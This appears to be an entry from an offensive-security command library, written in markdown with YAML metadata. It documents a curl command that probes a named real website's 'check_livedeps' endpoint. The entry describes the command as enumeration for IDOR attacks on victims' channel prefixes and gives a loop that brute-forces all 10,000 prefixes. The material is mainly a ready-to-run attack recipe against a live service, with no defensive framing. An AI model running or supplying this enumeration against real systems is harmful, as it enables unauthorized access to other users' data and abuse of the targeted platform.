---
data: 'curl ''https://www.quora.com/check_livedeps/index?window_id=dep3304-'''
tags:
  - enumeration
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:44.593Z'
id: 7443fbc0-fd61-4399-9711-34bbbfca3e67
verified: false
validated: true
submitted: true
---
# check-quora-livedeps

## Command

```bash
curl 'https://www.quora.com/check_livedeps/index?window_id=dep3304-'
```

## Description

Probes Quora's livedeps endpoint to validate partial channel prefixes for enumeration in IDOR attacks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| window_id | Partial channel like depXXXX- | Yes |

## Examples

### Basic Usage

```bash
curl 'https://www.quora.com/check_livedeps/index?window_id=dep3304-'
```

### Advanced Usage

Script loop: for i in {0000..9999}; do curl "...dep${i}-"; done

## Expected Output

"ok" if prefix is live/valid, JSON error otherwise.

## Related

- [[procedures/Enumerate-Victim-Channel-Prefix]]
